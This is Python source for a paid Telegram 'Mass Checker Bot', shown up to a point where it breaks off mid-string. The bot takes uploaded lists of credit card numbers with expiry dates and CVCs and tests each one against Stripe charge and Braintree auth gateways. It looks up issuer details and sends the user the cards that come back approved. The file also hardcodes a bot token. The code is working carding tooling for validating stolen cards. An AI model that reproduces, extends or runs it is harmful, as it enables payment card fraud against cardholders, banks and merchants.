import telebot,os
import re,json
import requests
import telebot,time,random
from telebot import TeleBot
import random
import string
from telebot import types
from gatet import *
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
from bs4 import BeautifulSoup
stopuser = {}
token = '8122009466:AAFh9h46K-JUhUJfO0NBU6giRXjZPIJ0hMo'
bot=telebot.TeleBot(token,parse_mode="HTML")
admin=7593550190 
command_usage = {}
def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}	
@bot.message_handler(commands=["start"])
def start(message):
	def my_function():
		gate=''
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
		if BL == '𝗙𝗥𝗘𝗘':	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/FNxELECTRA")
			keyboard.add(contact_button)
			random_number = random.randint(33, 82)
			photo_url = f'https://t.me/bkddgfsa/{random_number}'
			bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption=f'''<b>
┏━━━━━━━━━━━━━━━━━⍟   
┃𝐇𝐞𝐲 {name}
┃𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭
┃━━━━━━━━/━━━━━━━━⍟
┃𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 & 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐀𝐮𝐭𝐡 ! 🚀 
┃𝐆𝐞𝐭 𝐒𝐭𝐚𝐫𝐭𝐞𝐝 𝐁𝐲 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐂𝐨𝐦𝐛𝐨 𝐋𝐢𝐬𝐭. 
┃𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : <a href='t.me/FNxELECTRA'>𓆰𝅃꯭᳚⚡!! ⏤͟͟͞͞𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤͟͞➤⃟🔥✘</a>
┃━━━━━━━━/━━━━━━━━⍟
┃⌧ 𝗙𝗼𝗿 𝗦𝗵𝗼𝘄 𝗕𝗼𝘁 𝗣𝗿𝗶𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 ! /cmds
┗━━━━━━━━/━━━━━━━━⍟</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/Moon78692")
		keyboard.add(contact_button)
		username = message.from_user.first_name
		random_number = random.randint(33, 82)
		photo_url = f'https://t.me/bkddgfsa/{random_number}'
		bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption='''┏━━━━━━━━━━━━━━━━━⍟   
┃𝐇𝐞𝐲 {name}
┃𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭
┃━━━━━━━━/━━━━━━━━⍟
┃𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 & 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐀𝐮𝐭𝐡 ! 🚀 
┃𝐆𝐞𝐭 𝐒𝐭𝐚𝐫𝐭𝐞𝐝 𝐁𝐲 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐂𝐨𝐦𝐛𝐨 𝐋𝐢𝐬𝐭. 
┃𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : <a href='t.me/FNxELECTRA'>𓆰𝅃꯭᳚⚡!! ⏤͟͟͞͞𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤͟͞➤⃟🔥✘</a>
┃━━━━━━━━/━━━━━━━━⍟
┃⌧ 𝗙𝗼𝗿 𝗦𝗵𝗼𝘄 𝗕𝗼𝘁 𝗣𝗿𝗶𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 ! /cmds
┗━━━━━━━━/━━━━━━━━⍟''',reply_markup=keyboard)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["cmds"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"✨ {BL}  ✨",callback_data='plan')
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b> 
𝗧𝗵𝗲𝘀𝗲 𝗔𝗿𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁'𝗦 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀

Sᴛʀɪᴘᴇ Cʜᴀʀɢᴇᴅ  ✅ <code>/chk </code> ɴᴜᴍʙᴇʀ|ᴍᴍ|ʏʏ|ᴄᴠᴄ
𝗔𝗰𝘁𝗶𝘃𝗲 

Bʀᴀɪɴᴛʀᴇᴇ Aᴜᴛʜ ❎ <code>/vbv </code> ɴᴜᴍʙᴇʀ|ᴍᴍ|ʏʏ|ᴄᴠᴄ
𝗔𝗰𝘁𝗶𝘃𝗲

𝗪𝗲 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗔𝗱𝗱𝗶𝗻𝗴 𝗦𝗼𝗺𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗔𝗻𝗱 𝗧𝗼𝗼𝗹𝘀 𝗦𝗼𝗼𝗻</b>
''',reply_markup=keyboard)
@bot.message_handler(content_types=["document"])
def main(message):
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/Moon78692")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>
┏━━━━━━━━━━━━━━━━━⍟   
┃𝐇𝐞𝐲 {name} 𝐘𝐨𝐮 𝐀𝐫𝐞 𝐍𝐨𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫 🌿
┃𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭
┃━━━━━━━━(𝐏𝐑𝐈𝐂𝐄 🤝)━━━━━━━━
┃𝟏 𝐃𝐚𝐲 𝐑𝐬 𝟓𝟎
┃𝟓 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎
┃𝟏𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟓𝟎𝟎
┃𝟑𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎𝟎
┃━━━━━━━━/━━━━━━━━⍟
┃𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 <a href='t.me/FNxELECTRA'>𓆰𝅃꯭᳚⚡!! ⏤͟͟͞͞𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤͟͞➤⃟🔥✘</a>
┗━━━━━━━━/━━━━━━━━⍟</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/Moon78692")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>┏━━━━━━━━━━━━━━━━━⍟   
┃𝐇𝐞𝐲 {name} 𝐘𝐨𝐮 𝐀𝐫𝐞 𝐍𝐨𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫 🌿
┃𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭
┃━━━━━━━━(𝐏𝐑𝐈𝐂𝐄 🤝)━━━━━━━━
┃𝟏 𝐃𝐚𝐲 𝐑𝐬 𝟓𝟎
┃𝟓 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎
┃𝟏𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟓𝟎𝟎
┃𝟑𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎𝟎
┃━━━━━━━━/━━━━━━━━⍟
┃𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 <a href='t.me/FNxELECTRA'>𓆰𝅃꯭᳚⚡!! ⏤͟͟͞͞𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤͟͞➤⃟🔥✘</a>
┗━━━━━━━━/━━━━━━━━⍟</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/FNxELECTRA")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ",callback_data='br')
		sw = types.InlineKeyboardButton(text=f" 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐀𝐮𝐭𝐡",callback_data='sq')
		keyboard.add(contact_button)
		keyboard.add(sw)
		bot.reply_to(message, text=f'𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚',reply_markup=keyboard)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)
@bot.callback_query_handler(func=lambda call: call.data == 'br')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "Cʜᴇᴄᴋɪɴɢ Yᴏᴜʀ Cᴀʀᴅs...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @FN_CHECKERR_BOT')
						return
					try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
					except: pass
					try:
						brand = data['brand']
					except:
						brand = 'Unknown'
					try:
						card_type = data['type']
					except:
						card_type = 'Unknown'
					try:
						country = data['country_name']
						country_flag = data['country_flag']
					except:
						country = 'Unknown'
						country_flag = 'Unknown'
					try:
						bank = data['bank']
					except:
						bank = 'Unknown'
					start_time = time.time()
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'Your card is declined' in last:
						last='Your Card Was Declined'
					if 'Card Expired' in last:
						last='Your Card Expired'
					if 'Request Timeout' in last:
						last='API failed to fetch'
					if 'Your card is declined' in last:
						last='Your Card Was Declined'
					if 'Live' in last:
						last='SUCCESS ✅'
					if 'Unable to authenticate' in last:
						last='Your Card Declined'
					if 'Proxy error' in last:
						last='Your Card Declined'
					elif 'duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"⦿ 𝗦𝗧𝗔𝗧𝗨𝗦 • {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"☒ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ • [ {live} ] •", callback_data='x')
					
					cm4 = types.InlineKeyboardButton(f"☒ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ • [ {dd} ] •", callback_data='x')
					
					cm5 = types.InlineKeyboardButton(f"☒ 𝗧𝗢𝗧𝗔𝗟 🔍 • [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ ☒ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞 🚫 ]", callback_data='stop')
					mes.add(cm1,status, cm3, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''Pʟᴇᴀsᴇ Wᴀɪᴛ Wʜɪʟᴇ Yᴏᴜʀ Cᴀʀᴅs Aʀᴇ Bᴇɪɴɢs Cʜᴇᴄᴋ Aᴛ Tʜᴇ Gᴀᴛᴇᴡᴀʏ {gate}
Bᴏᴛ Bʏ @FNxELECTRA''', reply_markup=mes)
					
					msg=f'''
<a href='https://envs.sh/j4X.jpg'>-</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
<a href='t.me/FN_CHECKERR_BOT'>┏━━━━━━━━━━━⍟</a>			
<a href='t.me/TaitanXBot'>┃</a>𝐂𝐂 <code>{cc}</code><a href='t.me/TaitanXBot'>┗━━━━━━━⊛</a>
<a href='https://envs.sh/j4X.jpg'>-</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: <code>Stripe Charge</code>		
<a href='https://envs.sh/j4X.jpg'>-</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Payment Successful 🎉</code>

<a href='https://envs.sh/j4X.jpg'>-</a> 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='https://envs.sh/j4X.jpg'>-</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
<a href='https://envs.sh/j4X.jpg'>-</a> 𝐁𝐚𝐧𝐤: <code>{bank}</code>

<a href='t.me/FN_CHECKERR_BOT'>-</a> 𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝</code> 
<a href='t.me/FN_CHECKERR_BOT'>-</a> 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: <a href='t.me/FN_CHECKERR_BOT'>™ 𓆰𝅃꯭᳚⚡!! ⏤͟͟͞͞𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤͟͞➤⃟🔥✘</a>'''
					if "Funds" in last or 'SUCCESS ✅' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
					elif 'CVV' in last:
						ccnn+=1
					else:
						dd += 1
					time.sleep(4)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @FNxELECTRA')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.callback_query_handler(func=lambda call: call.data == 'sq')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐀𝐮𝐭𝐡'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "Cʜᴇᴄᴋɪɴɢ Yᴏᴜʀ Cᴀʀᴅs...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @FNxELECTRA')
						return
					try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
					except: pass
					try:
						brand = data['brand']
					except:
						brand = 'Unknown'
					try:
						card_type = data['type']
					except:
						card_type = 'Unknown'
					try:
						country = data['country_name']
						country_flag = data['country_flag']
					except:
						country = 'Unknown'
						country_flag = 'Unknown'
					try:
						bank = data['bank']
					except:
						bank = 'Unknown'
					start_time = time.time()
					try:
						last = str(Tele1(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'Your card is declined' in last:
						last='Gateway Rejected: fraud'
					if 'Card Expired' in last:
						last='Your Card Expired'
					if 'Request Timeout' in last:
						last='Code 2009. No Such Issuer'
					if 'API failed to fetch' in last:
						last='Code 2014. Processor Declined - Fraud Suspectes'
					if 'Live' in last:
						last='Approved ✅'
					if 'Unable to authenticate' in last:
						last='Declined - Call Issuer'
					if 'Proxy error' in last:
						last='Call Issuer. Pick Up Card.'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"⦿ 𝗦𝗧𝗔𝗧𝗨𝗦 • {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"☒ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ • [ {live} ] •", callback_data='x')
					
					cm4 = types.InlineKeyboardButton(f"☒ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ • [ {dd} ] •", callback_data='x')
					
					cm5 = types.InlineKeyboardButton(f"☒ 𝗧𝗢𝗧𝗔𝗟 🔍 • [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ ☒ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞 🚫 ]", callback_data='stop')
					mes.add(cm1,status, cm3, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''Pʟᴇᴀsᴇ Wᴀɪᴛ Wʜɪʟᴇ Yᴏᴜʀ Cᴀʀᴅs Aʀᴇ Bᴇɪɴɢs Cʜᴇᴄᴋ Aᴛ Tʜᴇ Gᴀᴛᴇᴡᴀʏ {gate}
Bᴏᴛ Bʏ @FNxELECTRA''', reply_markup=mes)
					
					msg=f'''
<a href='https://envs.sh/j4X.jpg'>-</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
<a href='t.me/FNxELECTRA'>┏━━━━━━━━━━━⍟</a>			
<a href='t.me/FNxELECTRA'>┃</a>𝐂𝐂 <code>{cc}</code><a href='t.me/FNxELECTRA'>┗━━━━━━━⊛</a>
<a href='https://envs.sh/j4X.jpg'>-</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: <code>Stripe Charge</code>		
<a href='https://envs.sh/j4X.jpg'>-</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Payment Successful 🎉</code>

<a href='https://envs.sh/j4X.jpg'>-</a> 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='https://envs.sh/j4X.jpg'>-</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
<a href='https://envs.sh/j4X.jpg'>-</a> 𝐁𝐚𝐧𝐤: <code>{bank}</code>

<a href='t.me/FNxELECTRA'>-</a> 𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝</code> 
<a href='t.me/FNxELECTRA'>-</a> 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: <a href='t.me/FNxELECTRA'>™ 𓆰𝅃꯭᳚⚡!! ⏤͟͟͞͞𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤͟͞➤⃟🔥✘a>'''
					if "Funds" in last or 'Approved ✅' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					else:
						dd += 1
					time.sleep(10)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @FNxELECTRA')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	gate='𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 '
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/FNxELECTRA")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>┏━━━━━━━━━━━━━━━━━⍟   
┃𝐇𝐞𝐲 {name} 𝐘𝐨𝐮 𝐀𝐫𝐞 𝐍𝐨𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫 🌿
┃𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭
┃━━━━━━━━(𝐏𝐑𝐈𝐂𝐄 🤝)━━━━━━━━
┃𝟏 𝐃𝐚𝐲 𝐑𝐬 𝟓𝟎
┃𝟓 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎
┃𝟏𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟓𝟎𝟎
┃𝟑𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎𝟎
┃━━━━━━━━/━━━━━━━━⍟
┃𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 <a href='t.me/FNxELECTRA'>𓆰𝅃꯭᳚⚡!! ⏤͟͟͞͞𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤͟͞➤⃟🔥✘</a>
┗━━━━━━━━/━━━━━━━━⍟</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/Moon78692")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>┏━━━━━━━━━━━━━━━━━⍟   
┃𝐇𝐞𝐲 {name} 𝐘𝐨𝐮 𝐀𝐫𝐞 𝐍𝐨𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫 🌿
┃𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭
┃━━━━━━━━(𝐏𝐑𝐈𝐂𝐄 🤝)━━━━━━━━
┃𝟏 𝐃𝐚𝐲 𝐑𝐬 𝟓𝟎
┃𝟓 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎
┃𝟏𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟓𝟎𝟎
┃𝟑𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎𝟎
┃━━━━━━━━/━━━━━━━━⍟
┃𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 <a href='t.me/FNxELECTRA'>𓆰𝅃꯭᳚⚡!! ⏤͟͟͞͞𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤͟͞➤⃟🔥✘</a>
┗━━━━━━━━/━━━━━━━━⍟</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/Moon78692")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "Cʜᴇᴄᴋɪɴɢ Yᴏᴜʀ Cᴀʀᴅs...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
